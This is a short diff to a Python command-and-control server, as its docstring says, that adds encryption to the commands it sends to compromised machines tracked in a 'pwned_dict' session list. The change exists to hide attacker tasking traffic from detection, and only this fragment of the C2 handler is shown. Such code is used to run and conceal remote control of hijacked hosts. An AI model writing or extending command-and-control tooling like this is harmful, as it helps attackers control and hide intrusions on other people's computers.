@@ -4,6 +4,7 @@ C2 Server side code
 """
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
+from crypt import cipher
 from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
     CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 from inputimeout import inputimeout, TimeoutOccurred
@@ -76,7 +77,7 @@ class C2Handler(BaseHTTPRequestHandler):
                 try:
                     self.http_response(HTTPStatusCode.OK.value)
                     # passing back command to client; must be utf-8 encode
-                    self.wfile.write(cmd.encode())
+                    self.wfile.write(cipher.encrypt(cmd.encode()))
                 except BrokenPipeError as e:
                     print(f"Lost connection to {pwned_dict[active_session]}.\n")
                     get_new_session()
